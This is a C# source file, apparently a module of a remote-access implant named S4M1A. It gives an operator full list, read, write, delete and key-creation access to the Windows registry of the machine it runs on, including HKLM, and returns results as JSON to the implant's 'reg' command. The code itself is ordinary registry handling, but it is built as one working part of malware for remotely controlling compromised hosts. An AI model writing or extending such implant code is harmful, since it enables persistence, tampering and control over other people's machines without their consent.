using System;
using System.Text;
using Microsoft.Win32;
using S4M1A.Implant; // JsonUtil (defined in Commands.cs)

namespace S4M1A.Implant.Modules
{
    // =====================================================================
    //  S4M1A RegistryManager v1.0 - registry enumeration / read / write
    //
    //  Contract (used by Commands.cs via the "reg" command):
    //    RegistryManager.List(key)       -> JSON array of subkeys+values
    //    RegistryManager.ReadValue(k,v)  -> data as text | "ERR: ..."
    //    RegistryManager.SetValue(k,v,t,d)-> "true" | "ERR: ..."
    //    RegistryManager.Delete(k,v)     -> "true" | "ERR: ..."
    //    RegistryManager.CreateKey(k)    -> "true" | "ERR: ..."
    //
    //  Key syntax: HKCU\Software\MyApp  (hive HKCR|HKCU|HKLM|HKU|HKCC).
    //  List() entry format: {"t":"k|v","n":"name","s":size,"m":"meta"}
    //    t="k" -> subkey  (s=0, m="")
    //    t="v" -> value   (s=byte size of data, m=REG_* type name)
    //  Set types: s=string d=dword q=qword b=binary(hex) m=multi(';'-sep)
    // =====================================================================

    public static class RegistryManager
    {
        public static string List(string key)
        {
            try
            {
                RegistryKey hive;
                string sub;
                if (!ParseKey(key, out hive, out sub)) return "ERR: bad key path";

                using (RegistryKey k = hive.OpenSubKey(sub, false))
                {
                    if (k == null) return "ERR: key not found";

                    StringBuilder sb = new StringBuilder();
                    sb.Append('[');
                    bool first = true;

                    foreach (string name in k.GetSubKeyNames())
                    {
                        if (!first) sb.Append(',');
                        first = false;
                        AddEntry(sb, "k", name, 0, "");
                    }
                    foreach (string name in k.GetValueNames())
                    {
                        if (!first) sb.Append(',');
                        first = false;
                        string label = (name.Length == 0) ? "(Default)" : name;
                        try
                        {
                            object val = k.GetValue(name);
                            long size = (val is byte[]) ? ((byte[])val).Length
                                      : (val is string) ? Encoding.UTF8.GetByteCount((string)val)
                                      : 4;
                            string kind = k.GetValueKind(name).ToString();
                            AddEntry(sb, "v", label, size, kind);
                        }
                        catch { AddEntry(sb, "v", label, 0, "REG_UNKNOWN"); }
                    }
                    sb.Append(']');
                    return sb.ToString();
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string ReadValue(string key, string value)
        {
            try
            {
                RegistryKey hive;
                string sub;
                if (!ParseKey(key, out hive, out sub)) return "ERR: bad key path";

                using (RegistryKey k = hive.OpenSubKey(sub, false))
                {
                    if (k == null) return "ERR: key not found";
                    object val = k.GetValue(value, null);
                    if (val == null)
                        return "ERR: value not found: " + value;
                    return FormatValue(val);
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string SetValue(string key, string value, string type, string data)
        {
            try
            {
                RegistryKey hive;
                string sub;
                if (!ParseKey(key, out hive, out sub)) return "ERR: bad key path";

                using (RegistryKey k = hive.OpenSubKey(sub, true))
                {
                    if (k == null) return "ERR: key not found";

                    switch (type)
                    {
                        case "s":
                            k.SetValue(value, data ?? "", RegistryValueKind.String);
                            break;
                        case "d":
                            k.SetValue(value, ParseNumber(data, 32), RegistryValueKind.DWord);
                            break;
                        case "q":
                            k.SetValue(value, ParseNumber(data, 64), RegistryValueKind.QWord);
                            break;
                        case "b":
                            k.SetValue(value, HexToBytes(data), RegistryValueKind.Binary);
                            break;
                        case "m":
                            k.SetValue(value,
                                (data ?? "").Split(new[] { ';' }, StringSplitOptions.RemoveEmptyEntries),
                                RegistryValueKind.MultiString);
                            break;
                        default:
                            return "ERR: unknown type '" + type + "' (s|d|q|b|m)";
                    }
                    return "true";
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string Delete(string key, string value)
        {
            try
            {
                RegistryKey hive;
                string sub;
                if (!ParseKey(key, out hive, out sub)) return "ERR: bad key path";

                if (value.Length == 0)
                {
                    // delete the whole key (and subtree)
                    string parent = sub;
                    string leaf = "";
                    int i = sub.LastIndexOf('\\');
                    if (i >= 0)
                    {
                        parent = sub.Substring(0, i);
                        leaf = sub.Substring(i + 1);
                    }
                    using (RegistryKey p = hive.OpenSubKey(parent, true))
                    {
                        if (p == null) return "ERR: parent key not found";
                        p.DeleteSubKeyTree(leaf);
                    }
                    return "true";
                }

                using (RegistryKey k = hive.OpenSubKey(sub, true))
                {
                    if (k == null) return "ERR: key not found";
                    k.DeleteValue(value, false);
                    return "true";
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string CreateKey(string key)
        {
            try
            {
                RegistryKey hive;
                string sub;
                if (!ParseKey(key, out hive, out sub)) return "ERR: bad key path";

                using (RegistryKey k = hive.CreateSubKey(sub))
                {
                    if (k == null) return "ERR: create failed";
                    return "true";
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        // ------------------------- helpers -------------------------

        private static bool ParseKey(string key, out RegistryKey hive, out string sub)
        {
            hive = null;
            sub = null;
            if (string.IsNullOrEmpty(key)) return false;

            int i = key.IndexOf('\\');
            string h = (i < 0) ? key : key.Substring(0, i);
            string rest = (i < 0) ? "" : key.Substring(i + 1);

            switch (h.ToUpperInvariant())
            {
                case "HKCR": hive = Registry.ClassesRoot; break;
                case "HKCU": hive = Registry.CurrentUser; break;
                case "HKLM": hive = Registry.LocalMachine; break;
                case "HKU":  hive = Registry.Users; break;
                case "HKCC": hive = Registry.CurrentConfig; break;
                default: return false;
            }
            sub = rest;
            return true;
        }

        private static string FormatValue(object val)
        {
            if (val is byte[]) return "0x" + BitConverter.ToString((byte[])val).Replace("-", "");
            if (val is string[]) return string.Join(";", (string[])val);
            if (val is int)   return ((int)val).ToString() + " (0x" + ((int)val).ToString("X8") + ")";
            if (val is long)  return ((long)val).ToString() + " (0x" + ((long)val).ToString("X16") + ")";
            return Convert.ToString(val);
        }

        private static long ParseNumber(string s, int bits)
        {
            s = (s ?? "").Trim();
            if (s.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
                return Convert.ToInt64(s.Substring(2), 16);
            return Convert.ToInt64(s, 10);
        }

        private static byte[] HexToBytes(string hex)
        {
            hex = (hex ?? "").Replace(" ", "").Replace("0x", "");
            if (hex.Length % 2 != 0) hex = "0" + hex;
            byte[] data = new byte[hex.Length / 2];
            for (int i = 0; i < data.Length; i++)
                data[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return data;
        }

        private static void AddEntry(StringBuilder sb, string t, string n, long s, string m)
        {
            sb.Append("{\"t\":\"").Append(t).Append("\",")
              .Append("\"n\":\"").Append(JsonUtil.Escape(n)).Append("\",")
              .Append("\"s\":").Append(s.ToString()).Append(",")
              .Append("\"m\":\"").Append(JsonUtil.Escape(m)).Append("\"}");
        }
    }
}
